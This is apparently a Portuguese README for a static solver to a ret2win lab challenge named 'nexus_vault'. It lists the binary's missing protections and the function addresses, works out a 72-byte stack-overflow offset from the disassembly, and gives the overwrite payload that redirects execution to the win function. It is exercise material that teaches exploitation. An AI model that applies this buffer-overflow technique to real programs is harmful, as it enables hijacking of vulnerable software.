# nexus_vault — exploit_solver (ret2win)

Solver 100% estático do caso `nexus_vault`. O contrato do Nexus proíbe
execução do alvo (`allow_dynamic_debugging=false`), portanto o solver
nunca roda o binário nem abre processo: só gera o payload (modo `--dry`).

## Binário
- ELF 64-bit LSB executable, x86-64, dynamically linked, NOT STRIPPED.
- Sem canary, sem PIE, NX desligado (conforme declaração da lane).
- `win` em `0x401176`; `main` em `0x4011E6`.

## Offset (matemática)
O disassembly de `main` mostra o buffer no stack:

- `sub $0x40,%rsp`          ; reserva 0x40 = 64 bytes na pilha
- `lea -0x40(%rbp),%rax`    ; buffer começa em rbp-0x40
- `call <read@plt>`         ; read(0, buf, 0x200) — estouro à vontade

Layout do frame quando `read` retorna:

    rbp-0x40  [  buf  : 64 bytes  ]  <- início do buffer
    rbp       [ rbp salvado : 8 B ]  <- overwrite com lixo
    rbp+0x08  [ return addr: 8 B ]  <- sobrescrever com &win

Deslocamento do buffer até o endereço de retorno:

    offset = tamanho(buf) + tamanho(rbp salvado)
           = 64 + 8
           = 72

payload = b"A" * 72 + p64(0x401176)

## Uso
    python3 exploit_solver.py --dry   # imprime o payload em hexa

Saída esperada (72x 'A' + win little-endian), ex.:

    4141414141414141 ... 4141 7611400000000000

Requires: pwntools (`pip install pwntools`).
